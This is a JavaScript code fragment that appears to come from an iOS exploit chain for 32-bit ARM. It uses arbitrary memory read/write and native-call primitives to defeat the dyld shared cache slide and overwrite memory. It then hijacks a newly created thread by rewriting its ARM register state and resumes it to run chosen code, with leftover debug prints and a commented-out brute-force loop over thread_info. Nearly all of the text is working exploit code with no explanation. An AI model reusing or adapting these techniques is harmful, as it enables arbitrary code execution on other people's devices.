var dyld_shc_slide = get_dyld_shc_slide();

	printf("still alive0\n");
	write_u32(0x346afc48 + dyld_shc_slide, 0x23d751fc + dyld_shc_slide);
	printf("still alive1\n");
	write_u32(stack_shit + 0x0, 0x42069);
	printf("still alive2\n");
	write_u32(stack_shit + 0x1, 0x69420);
	printf("still alive3\n");
	write_u32(stack_shit + 0x2, 0x13371337);
	printf("still alive4\n");
	write_u32(stack_shit + 0x3, 0x6969);
	printf("still alive5\n");

	printf("%s\n", prim_hexdump(read_buf(thread, 0x100)));
	calls4arg("pthread_create", threadptr, 0, 0x23d751fc + dyld_shc_slide, 0);
	printf("%x\n", read_u32(threadptr));
	thread = read_u32(threadptr);
	calls4arg("usleep", 100000, 0, 0, 0);
	printf("%s\n", prim_hexdump(read_buf(thread, 0x100)));
//	call4arg(0x41414141, 0, 0, 0, 0);
	printf("still alive6\n");
	write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
//	write_u32(th, 0xa03);
	printf("thread=%x th=%x sym=%x\n", read_u32(thread), read_u32(th), sym_cache["pthread_mach_thread_np"]);

	var info = 0x134004;
	var whatever = 0x134000;

	/*
	var lol = new Uint8Array(0x100);

	for (i = 0; i < 0x10000; i++) {
		write_buf(info, lol, 0x100);
		write_u32(whatever, 0x100)
//	printf("%x\n", calls4arg("mach_thread_self", 0, 0, 0, 0));
	calls4arg("thread_info", i, 3, info, whatever);
//	printf("%s\n", prim_hexdump(read_buf(info, 0x100)));
		if (read_u32(info) != 0) {
//	printf("%s\n", prim_hexdump(read_buf(info, 0x100)));
			printf("hit: %x\n", i);
		} else if (i % 0x10 == 0) {
			printf("%x\n", i);
		}
	}*/

	printf("still alive7\n");
	write_u32(thread_state + (0 << 2), sptr("Hello, world! %x %x %x %x %x %x %x\n"));
	printf("still alive8\n");
	write_u32(thread_state + (1 << 2), 0x1337);
	printf("still alive9\n");
	write_u32(thread_state + (2 << 2), 0x420);
	printf("still alive10\n");
	write_u32(thread_state + (3 << 2), 0x69);
	printf("still alive11\n");
	write_u32(thread_state + (13 << 2), stack_shit);
	printf("still alive12\n");
	write_u32(thread_state + (14 << 2), 0x23d751fc + dyld_shc_slide);
	printf("still alive13\n");
	write_u32(thread_state + (15 << 2), sym_cache["printf"]);
	printf("still alive14\n");
	write_u32(thread_state + (16 << 2), 0x40000020);

	printf("still alive15\n");
	printf("%d\n", calls4arg("thread_set_state", read_u32(th), ARM_THREAD_STATE, thread_state, ARM_THREAD_STATE_COUNT));
	printf("still alive16\n");
	printf("%d\n", calls4arg("thread_resume", read_u32(th), 0, 0, 0));
	printf("still alive17\n");

	calls4arg("sleep", 10, 0, 0, 0);